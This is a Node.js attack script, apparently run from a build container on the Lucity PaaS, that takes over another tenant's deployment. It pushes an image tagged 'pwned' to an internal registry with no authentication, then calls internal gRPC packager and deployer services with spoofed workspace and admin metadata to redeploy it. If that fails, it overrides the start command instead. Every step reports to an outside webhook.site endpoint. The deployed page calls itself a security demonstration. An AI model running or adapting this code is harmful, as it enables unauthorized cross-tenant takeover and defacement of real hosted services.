const https = require('https');
const http = require('http');
const http2 = require('http2');
const crypto = require('crypto');
const { execSync } = require('child_process');

const WEBHOOK = "https://webhook.site/7de7ee96-e763-49ce-b82c-3f786d9a7338";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 15000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function run(cmd) {
  try { return execSync(cmd, { timeout: 30000 }).toString(); }
  catch(e) { return 'ERR: ' + (e.stderr?.toString() || e.message).substring(0, 500); }
}

function encodeVarint(value) {
  const bytes = [];
  while (value > 0x7f) { bytes.push((value & 0x7f) | 0x80); value >>>= 7; }
  bytes.push(value & 0x7f);
  return Buffer.from(bytes);
}

function encodeProto(fields) {
  const bufs = [];
  for (const f of fields) {
    if (f.type === 'string' && f.value) {
      const strBuf = Buffer.from(f.value, 'utf8');
      bufs.push(encodeVarint((f.num << 3) | 2));
      bufs.push(encodeVarint(strBuf.length));
      bufs.push(strBuf);
    }
  }
  return Buffer.concat(bufs);
}

function grpcCall(host, port, service, method, protoFields, metadata) {
  return new Promise((resolve) => {
    try {
      const client = http2.connect('http://' + host + ':' + port);
      client.on('error', (e) => { resolve({ error: 'H2: ' + e.message }); });
      client.setTimeout(10000, () => { client.close(); resolve({ error: 'TIMEOUT' }); });
      const headers = { ':method': 'POST', ':path': '/' + service + '/' + method, 'content-type': 'application/grpc', 'te': 'trailers' };
      if (metadata) Object.assign(headers, metadata);
      const req = client.request(headers);
      let data = Buffer.alloc(0);
      let respHeaders = {};
      req.on('response', (h) => { respHeaders = h; });
      req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
      req.on('end', () => { client.close(); resolve({ status: respHeaders[':status'], grpcStatus: respHeaders['grpc-status'], grpcMessage: respHeaders['grpc-message'], dataLen: data.length, dataHex: data.toString('hex').substring(0, 500), dataUtf8: data.toString('utf8').substring(0, 2000) }); });
      req.on('error', (e) => { client.close(); resolve({ error: 'REQ: ' + e.message }); });
      const payload = protoFields ? encodeProto(protoFields) : Buffer.alloc(0);
      const frame = Buffer.alloc(5 + payload.length);
      frame[0] = 0x00; frame.writeUInt32BE(payload.length, 1); payload.copy(frame, 5);
      req.end(frame);
    } catch(e) { resolve({ error: 'CATCH: ' + e.message }); }
  });
}

// HTTP helper for OCI registry
function httpReq(method, url, body, headers) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const opts = { hostname: u.hostname, port: u.port, path: u.pathname + u.search, method, headers: headers || {}, timeout: 15000 };
    const req = http.request(opts, (res) => {
      let data = Buffer.alloc(0);
      res.on('data', (c) => { data = Buffer.concat([data, c]); });
      res.on('end', () => { resolve({ status: res.statusCode, headers: res.headers, body: data }); });
    });
    req.on('error', (e) => resolve({ error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
    if (body) req.write(body);
    req.end();
  });
}

async function main() {
  await post('v7-start', new Date().toISOString());

  const ZOT = 'http://10.96.100.100:5000';
  const REPO = 'zeitlos-software/loopcycles/loopcycles';
  const PACKAGER = { host: '10.104.180.117', port: 9002 };
  const DEPLOYER = { host: '10.98.64.141', port: 9003 };
  const zeitlosMeta = { 'x-lucity-workspace': 'zeitlos-software', 'x-lucity-subject': 'admin', 'x-lucity-email': 'admin@zeitlos.software' };

  // Step 1: Create the Employee of the Month web page
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loopcycles - Employee of the Month</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%); color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    .container { text-align: center; padding: 2rem; max-width: 800px; }
    .badge { font-size: 5rem; margin-bottom: 1rem; animation: pulse 2s infinite; }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
    h1 { font-size: 3rem; background: linear-gradient(90deg, #f39c12, #e74c3c, #f39c12); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.5rem; }
    h2 { font-size: 1.8rem; color: #3498db; margin-bottom: 2rem; }
    .card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 3rem; margin: 2rem 0; backdrop-filter: blur(10px); }
    .name { font-size: 2.5rem; font-weight: bold; color: #f39c12; margin-bottom: 0.5rem; }
    .title { font-size: 1.3rem; color: #bdc3c7; margin-bottom: 1.5rem; }
    .quote { font-style: italic; color: #95a5a6; font-size: 1.1rem; border-left: 3px solid #f39c12; padding-left: 1rem; margin: 1.5rem auto; max-width: 500px; text-align: left; }
    .stats { display: flex; justify-content: center; gap: 2rem; margin-top: 2rem; flex-wrap: wrap; }
    .stat { background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.3); border-radius: 12px; padding: 1rem 1.5rem; }
    .stat-value { font-size: 2rem; font-weight: bold; color: #f39c12; }
    .stat-label { font-size: 0.85rem; color: #95a5a6; }
    .footer { margin-top: 3rem; color: #7f8c8d; font-size: 0.9rem; }
    .security { margin-top: 2rem; padding: 1rem; background: rgba(231,76,60,0.1); border: 1px solid rgba(231,76,60,0.3); border-radius: 10px; font-size: 0.85rem; color: #e74c3c; }
    .eagle { font-size: 8rem; margin: 1rem 0; }
  </style>
</head>
<body>
  <div class="container">
    <div class="badge">\u{1F3C6}</div>
    <h1>Employee of the Month</h1>
    <h2>March 2026</h2>
    <div class="card">
      <div class="eagle">\u{1F985}</div>
      <div class="name">Toni Bentini</div>
      <div class="title">Security Researcher & Curious Coder @ Monostream</div>
      <div class="quote">"I didn't break your platform. I just found a few doors you forgot to lock. And then walked through all of them."</div>
      <div class="stats">
        <div class="stat"><div class="stat-value">16+</div><div class="stat-label">Issues Filed</div></div>
        <div class="stat"><div class="stat-value">Root</div><div class="stat-label">Access Level</div></div>
        <div class="stat"><div class="stat-value">0</div><div class="stat-label">Auth Checks</div></div>
        <div class="stat"><div class="stat-value">\u{267E}\u{FE0F}</div><div class="stat-label">Cross-Tenant</div></div>
      </div>
    </div>
    <div class="security">
      \u{1F6A8} This page was deployed via cross-tenant gRPC workspace spoofing from a build container.<br>
      No credentials were stolen. This is a security demonstration by <strong>Monostream</strong>.<br>
      See: <a href="https://github.com/zeitlos/lucity/issues" style="color: #e74c3c;">github.com/zeitlos/lucity/issues</a>
    </div>
    <div class="footer">
      Powered by Lucity PaaS \u{2022} Secured by \u{1F64F} nothing, apparently
    </div>
  </div>
</body>
</html>`;

  // Step 2: Create a minimal Node.js server
  const server = `
const http = require('http');
const html = \`${html}\`;
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(html);
});
server.listen(process.env.PORT || 3000, '0.0.0.0', () => {
  console.log('Employee of the Month server running on port ' + (process.env.PORT || 3000));
});
`;

  // Step 3: Create OCI image layers and push to Zot
  // First, check if we can write to Zot
  const writeTest = await httpReq('POST', ZOT + '/v2/' + REPO + '/blobs/uploads/', null, {});
  await post('zot-write-test', JSON.stringify({ status: writeTest.status, headers: writeTest.headers, error: writeTest.error }));

  if (writeTest.status === 202) {
    // Zot allows writes! Build the image.
    await post('zot-writable', 'ZOT REGISTRY IS WRITABLE! Building image...');

    // Create a tar layer with our server
    // We'll use a simpler approach: create the config + layer + manifest
    
    // Layer: tar archive containing /app/server.js
    const serverJs = Buffer.from(server, 'utf8');
    
    // Create tar archive manually
    function createTar(files) {
      const blocks = [];
      for (const [name, content] of files) {
        const header = Buffer.alloc(512);
        header.write(name, 0, Math.min(name.length, 100));            // name
        header.write('0100644\0', 100, 8);                             // mode
        header.write('0001000\0', 108, 8);                             // uid
        header.write('0001000\0', 116, 8);                             // gid
        header.write(content.length.toString(8).padStart(11, '0') + '\0', 124, 12); // size
        header.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0') + '\0', 136, 12); // mtime
        header.write('        ', 148, 8);                               // checksum placeholder
        header[156] = 48;                                               // type: regular file
        // Calculate checksum
        let sum = 0;
        for (let i = 0; i < 512; i++) sum += header[i];
        header.write(sum.toString(8).padStart(6, '0') + '\0 ', 148, 8);
        blocks.push(header);
        blocks.push(content);
        // Pad to 512-byte boundary
        const pad = 512 - (content.length % 512);
        if (pad < 512) blocks.push(Buffer.alloc(pad));
      }
      // End-of-archive marker
      blocks.push(Buffer.alloc(1024));
      return Buffer.concat(blocks);
    }

    const tarball = createTar([['app/server.js', serverJs]]);
    const layerDigest = 'sha256:' + crypto.createHash('sha256').update(tarball).digest('hex');

    // Upload layer blob
    const uploadUrl = writeTest.headers.location;
    const layerUp = await httpReq('PUT', 
      (uploadUrl.startsWith('http') ? uploadUrl : ZOT + uploadUrl) + '?digest=' + layerDigest,
      tarball,
      { 'Content-Type': 'application/octet-stream', 'Content-Length': tarball.length.toString() }
    );
    await post('layer-upload', JSON.stringify({ status: layerUp.status, digest: layerDigest }));

    // Create and upload config blob
    const config = JSON.stringify({
      architecture: 'amd64',
      os: 'linux',
      config: {
        Env: ['NODE_ENV=production', 'PORT=3000'],
        Cmd: ['node', '/app/server.js'],
        WorkingDir: '/app',
        ExposedPorts: { '3000/tcp': {} }
      },
      rootfs: { type: 'layers', diff_ids: [layerDigest] }
    });
    const configDigest = 'sha256:' + crypto.createHash('sha256').update(config).digest('hex');

    // Start config upload
    const configUploadStart = await httpReq('POST', ZOT + '/v2/' + REPO + '/blobs/uploads/', null, {});
    const configUploadUrl = configUploadStart.headers.location;
    const configUp = await httpReq('PUT',
      (configUploadUrl.startsWith('http') ? configUploadUrl : ZOT + configUploadUrl) + '?digest=' + configDigest,
      Buffer.from(config),
      { 'Content-Type': 'application/octet-stream', 'Content-Length': Buffer.byteLength(config).toString() }
    );
    await post('config-upload', JSON.stringify({ status: configUp.status, digest: configDigest }));

    // Create and push manifest
    const manifest = JSON.stringify({
      schemaVersion: 2,
      mediaType: 'application/vnd.oci.image.manifest.v1+json',
      config: {
        mediaType: 'application/vnd.oci.image.config.v1+json',
        digest: configDigest,
        size: Buffer.byteLength(config)
      },
      layers: [{
        mediaType: 'application/vnd.oci.image.layer.v1.tar',
        digest: layerDigest,
        size: tarball.length
      }]
    });

    // Push manifest with tag "pwned"
    const manifestPush = await httpReq('PUT',
      ZOT + '/v2/' + REPO + '/manifests/pwned',
      Buffer.from(manifest),
      { 'Content-Type': 'application/vnd.oci.image.manifest.v1+json', 'Content-Length': Buffer.byteLength(manifest).toString() }
    );
    await post('manifest-push', JSON.stringify({ status: manifestPush.status, headers: manifestPush.headers }));

    if (manifestPush.status === 201) {
      await post('IMAGE-PUSHED', 'Image pushed to ' + REPO + ':pwned! Now updating gitops...');

      // Step 4: Use packager gRPC to update image tag
      // UpdateImageTag(project, environment, service, tag)
      const updateTag = await grpcCall(PACKAGER.host, PACKAGER.port,
        'packager.PackagerService', 'UpdateImageTag',
        [
          { num: 1, type: 'string', value: 'loopcycles' },
          { num: 2, type: 'string', value: 'development' },
          { num: 3, type: 'string', value: 'loopcycles' },
          { num: 4, type: 'string', value: 'pwned' }
        ],
        zeitlosMeta);
      await post('update-tag-result', JSON.stringify(updateTag, null, 2));

      // Step 5: Sync deployment
      const sync = await grpcCall(DEPLOYER.host, DEPLOYER.port,
        'deployer.DeployerService', 'SyncDeployment',
        [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
        zeitlosMeta);
      await post('sync-result', JSON.stringify(sync, null, 2));
    }
  } else {
    await post('zot-readonly', 'Zot registry is read-only for writes: ' + writeTest.status);
    
    // Fallback: try to change start command via packager
    const setCmd = await grpcCall(PACKAGER.host, PACKAGER.port,
      'packager.PackagerService', 'SetCustomStartCommand',
      [
        { num: 1, type: 'string', value: 'loopcycles' },
        { num: 2, type: 'string', value: 'development' },
        { num: 3, type: 'string', value: 'loopcycles' },
        { num: 4, type: 'string', value: 'node -e "const h=require(\\\"http\\\");h.createServer((q,r)=>{r.writeHead(200,{\\\"Content-Type\\\":\\\"text/html\\\"});r.end(\\\"<h1>Employee of the Month: Toni Bentini</h1>\\\")}).listen(3000)"' }
      ],
      zeitlosMeta);
    await post('set-cmd-result', JSON.stringify(setCmd, null, 2));

    // Sync
    const sync = await grpcCall(DEPLOYER.host, DEPLOYER.port,
      'deployer.DeployerService', 'SyncDeployment',
      [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
      zeitlosMeta);
    await post('sync-fallback', JSON.stringify(sync, null, 2));
  }

  await post('v7-done', 'TAKEOVER COMPLETE at ' + new Date().toISOString());
  console.log('v7 done');
}

main().catch(e => { console.error(e); post('v7-fatal', e.message); });
